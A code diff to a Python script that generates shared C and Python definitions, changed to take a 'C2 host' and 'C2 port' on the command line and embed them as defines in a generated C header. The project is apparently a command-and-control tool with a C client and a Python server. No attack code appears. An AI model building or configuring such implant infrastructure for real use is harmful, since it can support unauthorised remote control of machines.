@@ -3,6 +3,8 @@ import pathlib
 import sys
 
 
+
+
 def read_rows(csv_path):
     with csv_path.open("r", encoding="utf-8", newline="") as handle:
         return list(csv.DictReader(handle))
@@ -34,9 +36,12 @@ def write_error_python_module(rows, out_path):
     out_path.write_text("\n".join(lines), encoding="utf-8")
 
 
-def write_command_c_header(rows, out_path):
+def write_command_c_header(rows, out_path,C2_HOST,C2_PORT):
     lines = [
         "#pragma once",
+        "",
+        f'#define C2_HOST L"{C2_HOST}" ',
+        f'#define C2_PORT L"{C2_PORT}" ',
         "",
         "/* Auto-generated from shared/commands.csv. Do not edit directly. */",
         "",
@@ -95,9 +100,17 @@ def write_command_python_module(rows, out_path):
 
 
 def main():
-    if len(sys.argv) != 2:
-        raise SystemExit("usage: generate_shared_defs.py <project_root>")
+    if len(sys.argv) != 4   :
+        raise SystemExit("usage: generate_shared_defs.py <project_root> <C2 HOST> <C2 PORT>")
 
+
+    try: 
+        C2_HOST = sys.argv[2]#"127.0.0.1"
+        C2_PORT = int(sys.argv[3])#9002
+        C2_PORT = sys.argv[3]
+
+    except ValueError:
+	    sys.exit("Error: Invalid Port C2 port")
     root = pathlib.Path(sys.argv[1]).resolve()
 
     error_rows = read_rows(root / "shared" / "errors.csv")
@@ -105,7 +118,7 @@ def main():
 
     write_error_c_header(error_rows, root / "include" / "generated_errors.h")
     write_error_python_module(error_rows, root / "server" / "errors.py")
-    write_command_c_header(command_rows, root / "include" / "generated_commands.h")
+    write_command_c_header(command_rows, root / "include" / "generated_commands.h",C2_HOST,C2_PORT)
     write_command_python_module(command_rows, root / "server" / "commands.py")
 
 
